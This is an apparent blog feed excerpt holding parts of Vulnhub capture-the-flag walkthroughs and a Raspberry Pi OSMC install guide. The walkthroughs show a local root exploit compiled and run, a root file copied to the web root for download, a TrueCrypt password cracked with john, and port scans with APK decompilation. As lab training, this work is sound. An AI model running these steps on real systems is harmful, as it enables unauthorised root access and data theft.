&lt;p&gt;We rename the file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mv 37292 ofs.c
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We compile it and add execution permission:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gcc ofs.c -o ofs
chmod +x ofs
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we just run it to gain root privileges on the box:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./ofs
collect2: error: ld returned 1 exit status
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can&amp;#39;t access tty; job control turned off
id
# uid=0(root) gid=0(root) groups=0(root),33(www-data)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Okay let us search for the flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ls /root/
# dave.tc
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;First hint&lt;/h2&gt;
&lt;p&gt;It seems we have a truecrypt volume, let's download it on our machine for more
investigation:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cp /root/dave.tc /var/www/html/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we can download it directly from the server at &lt;code&gt;http://10.0.2.4/dave.tc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We need to extract the hashes from the file to pass them to john, hopefully a
tool exist just for that (we need to compile it):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://article.gmane.org/gmane.comp.security.openwall.john.user/5320
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As the mail mention the academy and the hint mention the rockyou password list,
let us just extract the academy related passwords from it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;grep academy /media/sf_password_lists/rockyou.txt &amp;amp;gt; /tmp/test
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We launch john against the file with our partial rockyou list:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;john dave.tc.john -w=/tmp/test
Warning: detected hash type &amp;quot;tc_aes_xts&amp;quot;, but the string is also recognized as &amp;quot;tc_ripemd160&amp;quot;
Use the &amp;quot;--format=tc_ripemd160&amp;quot; option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (tc_aes_xts, TrueCrypt AES256_XTS [SHA512 128/128 AVX 2x /RIPEMD160/WHIRLPOOL])
Loaded hashes with cost 1 (hash algorithm [1:SHA512 2:RIPEMD160 3:Whirlpool]) varying from 1 to 3
Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 54.22% (ETA: 17:16:27) 0g/s 59.89p/s 359.3c/s 359.3C/s fordacademy..ffmusicacademy
etonacademy      (truecrypt_normal_volume)
1g 0:00:00:03 DONE (2016-05-10 17:16) 0.2724g/s 59.94p/s 331.8c/s 331.8C/s 06academy..!academy
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
Session completed
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We mount the container using veracrypt:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;veracrypt dave.tc -tc
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let us do a &lt;code&gt;tree -a&lt;/code&gt; to see what file we have in this container:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;.
âââ buller
âÂ Â  âââ BullingdonCrest.jpg
âââ lost+found [error opening dir]
âââ panama
âÂ Â  âââ shares.jpg
âââ .secret
    âââ piers.png
    âââ .top
        âââ flag.txt

5 directories, 4 files
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Content of ./secret/.top/flag.txt&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;################################################################################
#   ___ ___  _  _  ___ ___    _ _____ _   _ _      _ _____ ___ ___  _  _  ___  #
#  / __/ _ \| \| |/ __| _ \  /_\_   _| | | | |    /_\_   _|_ _/ _ \| \| |/ __| #
# | (_| (_) | .` | (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .` |\__ \ #
#  \___\___/|_|\_|\___|_|_\/_/ \_\_|  \___/|____/_/ \_\_| |___\___/|_|\_||___/ #
#                                                                              #
################################################################################

Firstly, thanks for trying this VM. If you have rooted it, well done!

Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
goes to barrebas and junken for help in testing and final configuration.
                                                                --knightmare
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It was a nice challenge, mainly for the beginner, probably a lack in the web
part (or the use of metapsloit, spoil myself of some fun exploiting the SQL
injection manually).&lt;/p&gt;
&lt;p&gt;Thanks to knightmare for the VM and as always thanks to vulnhub !&lt;/p&gt;</content><category term="drupal"></category><category term="security"></category><category term="vulnhub"></category></entry><entry><title>Installing OSMC without installer</title><link href="https://matthieukeller.com/2016/04/installing-osmc-without-installer.html" rel="alternate"></link><published>2016-04-14T23:49:00+02:00</published><updated>2016-04-14T23:49:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2016-04-14:/2016/04/installing-osmc-without-installer.html</id><summary type="html">&lt;p&gt;I bought the new raspberry pi 3 with integrated Wi-Fi. Currently I still have a
Ethernet cable running through my living room to my old raspberry pi 1.&lt;/p&gt;
&lt;p&gt;Just willing to download the last raspbmc version I figured that it was no more
raspbmc but osmc which is basically the same but with much marketing around it.
The most annoying one is that you need to install an install (such meta). I was
pretty much sure it was not really necessary and moreover there is no version of the
installer for Arch Linux.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;I bought the new raspberry pi 3 with integrated Wi-Fi. Currently I still have a
Ethernet cable running through my living room to my old raspberry pi 1.&lt;/p&gt;
&lt;p&gt;Just willing to download the last raspbmc version I figured that it was no more
raspbmc but osmc which is basically the same but with much marketing around it.
The most annoying one is that you need to install an install (such meta). I was
pretty much sure it was not really necessary and moreover there is no version of the
installer for Arch Linux.&lt;/p&gt;


&lt;p&gt;So instead using their installer you can download directly the image (you need to
click a button to display it) by selecting the right device and the last monthly
version.&lt;/p&gt;
&lt;p&gt;After the download just decompress the archive:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gunzip OSMC_TGT_rbp2_20160403.img.gz
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now you will need to know on which device is the sdcard. On Arch Linux with
system d, you may use &lt;code&gt;dmesg&lt;/code&gt; to have some info:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[  953.910932] mmc0: new high speed SDHC card at address e624
[  953.973940] mmcblk0: mmc0:e624 SD04G 3.69 GiB
[  953.982627]  mmcblk0: p1 p2
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;On my own computer the sdcard is named mmcblk0 and have two partition &lt;code&gt;p1&lt;/code&gt; and
&lt;code&gt;p2&lt;/code&gt;. From there you just need to copy the image to your sdcard (be sure to
remove the &lt;code&gt;p1&lt;/code&gt; or &lt;code&gt;p2&lt;/code&gt; if any, you need to write directly on the disk &lt;strong&gt;NOT&lt;/strong&gt;
on the partition):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dd if=OSMC_TGT_rbp2_20160403.img of=/dev/mmcblk0
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then put the sdcard back on the raspberry pi and OSMC will install itself on the
device. Next it will prompt you with the home screen and guide you through the
first install settings. You will need to set language, location, wireless
password and so on.&lt;/p&gt;
&lt;p&gt;If you need to connect to osmc, default username and password are:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;osmc&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;osmc&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If you need to add a SMB shared folder with authentication you will need to add
the share normally, get the error and then directly connect to the OSMC with
SSH and modify the XML file located at &lt;code&gt;home/osmc/.kodi/userdata/sources.xml&lt;/code&gt; by
adding the user and password as in the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;sources&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;...&lt;/span&gt;
    &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;video&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="n"&gt;pathversion&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;source&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;Prime&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="n"&gt;pathversion&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nl"&gt;smb&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//user:password@10.0.0.111/video/&amp;amp;lt;/path&amp;amp;gt;&lt;/span&gt;
        &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;source&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;video&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sources&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Save, &lt;strong&gt;REBOOT&lt;/strong&gt;, and it will work.&lt;/p&gt;
&lt;p&gt;Thanks to
&lt;a href="http://codetitans.pl/blog/post/osmc--smb-share-with-credentials"&gt;http://codetitans.pl&lt;/a&gt;
for this last part.&lt;/p&gt;</content><category term="osmc"></category><category term="raspberry"></category><category term="smb"></category></entry><entry><title>Vulnhub - FlickII</title><link href="https://matthieukeller.com/2016/03/vulnhub-flickii.html" rel="alternate"></link><published>2016-03-13T20:43:00+01:00</published><updated>2016-03-13T20:43:00+01:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2016-03-13:/2016/03/vulnhub-flickii.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2016.03/flickii.png" alt="FlickII" width="162"&gt;&lt;/p&gt;
&lt;p&gt;Still playing with the vulnhub machines this time it is the turn of FlickII.
This one is different from the others as it has an android application
associated. It would be a great exercice to play with mobile application,
decompile it and see what is in the inside.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2016.03/flickii.png" alt="FlickII" width="162"&gt;&lt;/p&gt;
&lt;p&gt;Still playing with the vulnhub machines this time it is the turn of FlickII.
This one is different from the others as it has an android application
associated. It would be a great exercice to play with mobile application,
decompile it and see what is in the inside.&lt;/p&gt;


&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2&gt;Host discovery&lt;/h2&gt;
&lt;p&gt;Connecting to host-only network:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo ip addr add 192.168.56.1/24 dev vboxnet
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Scanning the network to find the virtual machine IP address:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine flick-check-dist]$ nmap -sn 192.168.56.1/24

Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-30 18:41 CET
Nmap scan report for 192.168.56.1
Host is up (0.00061s latency).
Nmap scan report for 192.168.56.101
Host is up (0.00097s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.45 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Scanning the virtual machine to find open ports:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine flick-check-dist]$ nmap -p0-65535 192.168.56.101 -T4

Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-30 18:50 CET
Nmap scan report for 192.168.56.101
Host is up (0.00088s latency).
Not shown: 65534 filtered ports
PORT    STATE  SERVICE
80/tcp  closed http
443/tcp open   https

Nmap done: 1 IP address (1 host up) scanned in 123.28 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;APK analysis&lt;/h2&gt;
&lt;p&gt;We got an apk. If we unzip it we got lots of xml files and a dex file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ls ~/Downloads/flickII/flick-check-dist
AndroidManifest.xml  classes.dex  META-INF  README  res  resources.arsc
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There is a lot of tool in order to decompile and APK and get class files or jar
files like &lt;a href="http://siis.cse.psu.edu/dare/"&gt;dare&lt;/a&gt;,
&lt;a href="http://sourceforge.net/projects/dex2jar/"&gt;dex2jar&lt;/a&gt; and more (&lt;a href="http://shgck.io/docs/android/apk_decomp/"&gt;here is an article
about android decompiler comparison&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;I tried to use dare to convert dex file to Java bytecode but there was an issue
between my 64 bits Arch Linux system and the 32 bits executable. I didn't dig
this issue and just go for dex2jar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sh d2j-dex2jar.sh flick-check-dist.apk
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;From there I use &lt;a href="http://www.benf.org/other/cfr/"&gt;cfr&lt;/a&gt; to decompile the jar file
to Java files and human readable code.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;java -jar cfr_0_110.jar flickII/flick-check-dist-dex2jar.jar --outputdir flickII/flick-check-dist-cfr-java/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We got the decompiled code. The interesting part of the application is the
com/flick/flickeck folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;âââ com
âÂ Â  âââ flick
âÂ Â  âÂ Â  âââ flickcheck
âÂ Â  âÂ Â      âââ BuildConfig.java
âÂ Â  âÂ Â      âââ CallApi.java
âÂ Â  âÂ Â      âââ CommandActivity.java
âÂ Â  âÂ Â      âââ DoRegisterActivity.java
âÂ Â  âÂ Â      âââ MainActivity.java
âÂ Â  âÂ Â      âââ PubKeyManager.java
âÂ Â  âÂ Â      âââ ReadApiServerActivity.java
âÂ Â  âÂ Â      âââ RegisterActivity.java
âÂ Â  âÂ Â      âââ R.java
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We take a look at each file in this directory in order to understand the
application goal and how it works.&lt;/p&gt;
&lt;h3&gt;API token and DoRegisterActivity.java&lt;/h3&gt;
&lt;p&gt;The file DoRegisterActivity.java show us how to register a new device. By
testing the URL presented in the file we got:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine ~]$ curl   https://192.168.56.101/register/new --insecure
{&amp;quot;error&amp;quot;:&amp;quot;This method is not allowed for the requested resource.&amp;quot;}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We lack an ID to "authenticate" ourself. The line 70 to 75 show us how to get
this ID:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;object2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TelephonyManager&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getBaseContext&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getSystemService&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;phone&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getDeviceId&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;object2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSimSerialNumber&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;UUID&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;Settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Secure&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ContentResolver&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getContentResolver&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;android_id&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)).&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="o"&gt;()).&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;object2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSharedPreferences&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2131099666&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;api_server&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;CallAPI&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;execute&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;[])&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/register/new&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="o"&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let us wrote some Java to generate this ID for us:&lt;/p&gt;
&lt;p&gt;Our &lt;code&gt;object&lt;/code&gt; and &lt;code&gt;object2&lt;/code&gt; variables are named generically by the debugger. We
can see in the code above that &lt;code&gt;object&lt;/code&gt; is a string containing the device ID and
that &lt;code&gt;object2&lt;/code&gt; is a string containing the serial number of the Sim card.
Moreover the line where the code generate the new UUID (see the
&lt;a href="http://docs.oracle.com/javase/1.5.0/docs/api/java/util/UUID.html"&gt;javadoc&lt;/a&gt; for
more information about this object) use an other variable accessible on the
phone: the android ID.&lt;/p&gt;
&lt;p&gt;With all this information we come easily with the following code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.util.UUID&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;HelloWorld&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

  &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;deviceId&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;12345&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;SimSerialNumber&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;67890&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;androidId&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;34567&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

